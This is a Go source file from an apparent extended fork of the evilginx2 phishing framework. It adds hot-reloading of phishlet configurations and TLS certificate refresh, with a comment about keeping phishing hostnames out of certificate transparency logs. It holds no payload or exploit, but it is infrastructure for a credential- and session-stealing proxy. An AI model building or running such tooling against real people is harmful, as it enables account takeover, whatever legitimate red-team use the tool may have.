package core

// hotreload.go — evilginx2-extended: phishlet hot-reload (Pro parity).
// Console `phishlets reload`, API POST /phishlets/reload, and an optional
// fsnotify directory watcher (-no-watch to disable) all funnel into
// Config.ReloadPhishlets. Live consumers (http_proxy, botguard, apid,
// terminal) read c.phishlets at request time, so swapping map entries is
// enough; in-flight requests keep the old pointer until they finish.

import (
	"crypto/tls"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync/atomic"
	"time"

	"github.com/fsnotify/fsnotify"
	"github.com/kgretzky/evilginx2/log"
)

var errNoPhishletDir = fmt.Errorf("phishlets directory unknown")

type PhishletReloadReport struct {
	Added    []string `json:"added"`
	Removed  []string `json:"removed"`
	Reloaded []string `json:"reloaded"`
}

var phishletFileRe = regexp.MustCompile(`^([a-zA-Z0-9\-\.]+)\.yaml$`)

// ReloadPhishlets reconciles the phishlets directory with live state:
// new files are loaded, changed files re-parsed (pointer swap), vanished
// files removed from runtime (phishletConfig entries are kept so a
// hostname/enabled state survives a file reappearing).
func (c *Config) ReloadPhishlets(dir string) (*PhishletReloadReport, error) {
	if dir == "" {
		dir = c.PhishletsDir
	}
	if dir == "" {
		return nil, errNoPhishletDir
	}
	rep := &PhishletReloadReport{}

	c.mtx.Lock()
	defer c.mtx.Unlock()

	if c.phishletStamps == nil {
		c.phishletStamps = make(map[string]int64)
	}
	files, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	seen := make(map[string]bool)
	for _, f := range files {
		if f.IsDir() {
			continue
		}
		m := phishletFileRe.FindStringSubmatch(f.Name())
		if m == nil {
			continue
		}
		name := m[1]
		seen[name] = true
		full := filepath.Join(dir, f.Name())
		stamp := int64(0)
		if fi, err := f.Info(); err == nil {
			stamp = fi.ModTime().UnixNano()
		}
		old, exists := c.phishlets[name]
		if exists && old.Path == full && c.phishletStamps[name] == stamp {
			continue
		}
		pl, err := NewPhishlet(name, full, nil, c)
		if err != nil {
			log.Error("reload: %s: %v", f.Name(), err)
			continue
		}
		if !exists {
			c.phishletNames = append(c.phishletNames, name)
			rep.Added = append(rep.Added, name)
		} else {
			rep.Reloaded = append(rep.Reloaded, name)
		}
		c.phishlets[name] = pl
		c.phishletStamps[name] = stamp
	}

	for _, name := range append([]string{}, c.phishletNames...) {
		if seen[name] {
			continue
		}
		delete(c.phishlets, name)
		delete(c.phishletStamps, name)
		c.phishletNames = removeString(name, c.phishletNames)
		rep.Removed = append(rep.Removed, name)
		// sub-phishlets stay in the persisted "subphishlets" list; a restart
		// (or the parent file reappearing via create) brings them back
	}

	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	c.savePhishletsNL()
	return rep, nil
}

// RefreshCerts re-provisions TLS material after host sets change.
// Developer mode: drop the self-signed cache (re-cloned from origin on
// demand). Production with autocert: ACME sync for all active hostnames.
// Autocert OFF (wildcard DNS-01 node): reload the unmanaged site certs —
// a managed ACME sync here would issue per-host certs (CT-log burn) and
// leave unknown hostnames stuck in pending orders (TLS handshake hang).
func (p *HttpProxy) RefreshCerts() {
	if p.developer {
		p.crt_db.tlsCache = make(map[string]*tls.Certificate)
		return
	}
	if p.cfg.IsAutocertEnabled() {
		if err := p.crt_db.setManagedSync(p.cfg.GetActiveHostnames(""), 60*time.Second); err != nil {
			log.Error("refresh certs: %v", err)
		}
	} else {
		if err := p.crt_db.setUnmanagedSync(false); err != nil {
			log.Error("refresh certs: %v", err)
		}
	}
}

// WatchPhishlets auto-reloads the phishlets directory (debounced) until the
// process exits. Flag: -no-watch.
func WatchPhishlets(cfg *Config, dir string) {
	w, err := fsnotify.NewWatcher()
	if err != nil {
		log.Error("phishlet watcher disabled: %v", err)
		return
	}
	if err := w.Add(dir); err != nil {
		log.Error("phishlet watcher disabled for %s: %v", dir, err)
		return
	}
	log.Info("phishlets watcher active: %s", dir)

	var lastEvent atomic.Int64
	var lastDone atomic.Int64

	go func() {
		for {
			select {
			case ev, ok := <-w.Events:
				if !ok {
					return
				}
				if !strings.HasSuffix(ev.Name, ".yaml") {
					continue
				}
				lastEvent.Store(time.Now().UnixNano())
			case err, ok := <-w.Errors:
				if !ok {
					return
				}
				log.Error("phishlet watcher: %v", err)
			}
		}
	}()

	for {
		time.Sleep(500 * time.Millisecond)
		le := lastEvent.Load()
		if le > lastDone.Load() && time.Since(time.Unix(0, le)) > 1500*time.Millisecond {
			lastDone.Store(le)
			rep, err := cfg.ReloadPhishlets(dir)
			if err != nil {
				log.Error("watch reload: %v", err)
				continue
			}
			if n := len(rep.Added) + len(rep.Reloaded) + len(rep.Removed); n > 0 {
				log.Info("phishlets reloaded (watch): +%d ~%d -%d", len(rep.Added), len(rep.Reloaded), len(rep.Removed))
			}
		}
	}
}
